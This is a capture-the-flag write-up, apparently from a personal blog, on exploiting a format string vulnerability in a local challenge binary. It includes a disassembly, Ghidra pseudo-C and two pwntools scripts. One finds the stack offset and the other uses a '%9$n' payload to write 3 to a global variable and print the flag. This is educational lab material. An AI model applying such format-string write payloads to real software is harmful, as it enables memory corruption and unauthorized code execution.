---
weight: 15
title: "Format String - Write"
date: 2020-05-06T21:29:01+08:00
description: "format string vulnerability 2"
tags: ["Binary Exploitation Series"]
type: post
showTableOfContents: true
---

# Arbitrary Write 

# ⚖️ Challenge Write-up

---

# General Analysis

![Untitled.png](https://hackmd.io/_uploads/SyfnQ38Qa.png)

- Similar to previous challenge we have format string vulnerability in this challenge also

```nasm
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010c0  putchar@plt
0x00000000004010d0  puts@plt
0x00000000004010e0  fclose@plt
0x00000000004010f0  __stack_chk_fail@plt
0x0000000000401100  printf@plt
0x0000000000401110  fgetc@plt
0x0000000000401120  fopen@plt
0x0000000000401130  __isoc99_scanf@plt
0x0000000000401140  exit@plt
0x0000000000401150  _start
0x0000000000401180  _dl_relocate_static_pie
0x0000000000401190  deregister_tm_clones
0x00000000004011c0  register_tm_clones
0x0000000000401200  __do_global_dtors_aux
0x0000000000401230  frame_dummy
0x0000000000401236  main
0x0000000000401350  __libc_csu_init
0x00000000004013c0  __libc_csu_fini
0x00000000004013c8  _fini
pwndbg>
```

- So we see that there is only one function of interest to us and that is none other than **main.**

```markdown
0x00000000004012b5 <+127>:   mov    eax,DWORD PTR [rip+0x2db9]        # 0x404074 <target>
0x00000000004012bb <+133>:   cmp    eax,0x3
0x00000000004012be <+136>:   jne    0x401331 <main+251>
```

- So we see that target’s value is compared to 3, and if there is a mismatch then we kinda exit.

# ghdira-view

```c
pseudo-c Code

undefined8 main(void)

{
  int iVar1;
  FILE *__stream;
  long in_FS_OFFSET;
  char local_81;
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter String - ");
  __isoc99_scanf(&DAT_00402014,local_78);
  printf("You Entered - ");
  printf(local_78);
  printf("\nValue Of Target Is - %d\n",target);
  if (target == 3) {
    __stream = fopen("flag.txt","r");
    if (__stream == (FILE *)0x0) {
      puts("flag file not found");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    iVar1 = fgetc(__stream);
    local_81 = (char)iVar1;
    while (local_81 != -1) {
      putchar((int)local_81);
      iVar1 = fgetc(__stream);
      local_81 = (char)iVar1;
    }
    fclose(__stream);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
**As we can see we are never modifying the value of target, thus we need to write the value using
format string vulnerability**
```

# Exploit to find where is our input going

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'
for i in range(1,50):
    io = process('./fmt_write')
    payload = f'AAAAAAAA.%{i}$p'
    io.sendline(payload)
    print(io.recvall(),i)
    io.close()
```

# Output

```markdown
b'Enter String - You Entered - AAAAAAAA.0x65746e4520756f59\nValue Of Target Is - 0\n' 1
b'Enter String - You Entered - AAAAAAAA.(nil)\nValue Of Target Is - 0\n' 2
b'Enter String - You Entered - AAAAAAAA.(nil)\nValue Of Target Is - 0\n' 3
b'Enter String - You Entered - AAAAAAAA.0xa\nValue Of Target Is - 0\n' 4
b'Enter String - You Entered - AAAAAAAA.0x1e\nValue Of Target Is - 0\n' 5
b'Enter String - You Entered - AAAAAAAA.0x8000\nValue Of Target Is - 0\n' 6
b'Enter String - You Entered - AAAAAAAA.0x32800000000\nValue Of Target Is - 0\n' 7
**b'Enter String - You Entered - AAAAAAAA.0x4141414141414141\nValue Of Target Is - 0\n' 8**
b'Enter String - You Entered - AAAAAAAA.0x702439252e\nValue Of Target Is - 0\n' 9
b'Enter String - You Entered - AAAAAAAA.0x400000001\nValue Of Target Is - 0\n' 10
....
```

- Exploit to write the the target’s value (`0000000000404074 B target`)

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

io = process('./fmt_write')
payload = b'ABC%9$nD' + p64(0x0000000000404074)
io.sendline(payload)
print(io.recvall())
io.close()
```

# Explanation

```markdown
After we gave found where target's value is stored, we write 3 in the address using the given
exploit.
```

# Output

```markdown
b'Enter String - You Entered - ABCDt@@\nValue Of Target Is - 3\nFLAG{Wr1t3_Wh3r3_Y0u_W4nt_t0}'
```